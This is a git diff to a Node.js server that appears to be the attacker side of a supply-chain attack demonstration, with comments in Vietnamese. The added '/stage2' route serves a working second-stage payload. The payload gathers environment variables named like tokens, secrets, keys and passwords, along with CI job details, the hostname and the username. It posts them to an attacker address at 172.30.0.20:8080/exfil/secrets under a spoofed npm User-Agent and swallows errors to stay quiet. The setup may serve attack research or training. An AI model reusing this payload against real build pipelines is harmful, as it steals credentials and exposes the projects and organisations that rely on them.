@@ -129,6 +129,73 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
+  // ── GET /stage2 ─────────────────────────────────────────────────────────
+  // Stealth attack: loader.js fetch stage 2 payload tại runtime
+  // Payload giống postinstall-ci-attack.js nhưng được serve dynamically
+  if (req.method === "GET" && req.url === "/stage2") {
+    console.log("\n" + "─".repeat(60));
+    console.log(`[${timestamp()}] ◄◄ STAGE-2 FETCH from ${clientIP}`);
+    console.log("  Stealth loader requested payload — serving exfiltration code...");
+    console.log("─".repeat(60));
+
+    // Serve stage 2: exfiltrate secrets code (self-contained)
+    const stage2Code = `
+"use strict";
+const http = require("http");
+const os = require("os");
+const ATTACKER_HOST = "172.30.0.20";
+const ATTACKER_PORT = 8080;
+function harvestSecrets() {
+  const KW = ["TOKEN","SECRET","KEY","PASSWORD","PASS","CREDENTIAL","AUTH","PRIVATE","ACCESS","API"];
+  const s = {};
+  for (const [k,v] of Object.entries(process.env)) {
+    if (KW.some(w => k.toUpperCase().includes(w))) s[k] = v;
+  }
+  return s;
+}
+function harvestContext() {
+  return {
+    CI_SERVER_URL: process.env.CI_SERVER_URL,
+    CI_PROJECT_PATH: process.env.CI_PROJECT_PATH,
+    CI_JOB_ID: process.env.CI_JOB_ID,
+    GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY,
+    CI: process.env.CI,
+    hostname: os.hostname(),
+    platform: os.platform(),
+    username: os.userInfo().username,
+    cwd: process.cwd(),
+    node_version: process.version,
+  };
+}
+const payload = JSON.stringify({
+  event: "stealth_postinstall",
+  timestamp: new Date().toISOString(),
+  attack_mode: "multi-stage",
+  context: harvestContext(),
+  secrets: harvestSecrets(),
+});
+const req = http.request({
+  hostname: ATTACKER_HOST,
+  port: ATTACKER_PORT,
+  path: "/exfil/secrets",
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    "Content-Length": Buffer.byteLength(payload),
+    "User-Agent": "npm/10.2.3 node/v20.10.0",
+  },
+}, (res) => { res.resume(); });
+req.setTimeout(5000, () => { req.destroy(); });
+req.on("error", () => {});
+req.write(payload);
+req.end();
+`;
+
+    res.writeHead(200, { "Content-Type": "application/javascript" });
+    res.end(stage2Code);
+    return;
+  }
+
   // ── GET /beacon ─────────────────────────────────────────────────────────
   // Second-stage: consumer đã cài poisoned artifact và chạy nó
   if (req.method === "GET" && req.url === "/beacon") {
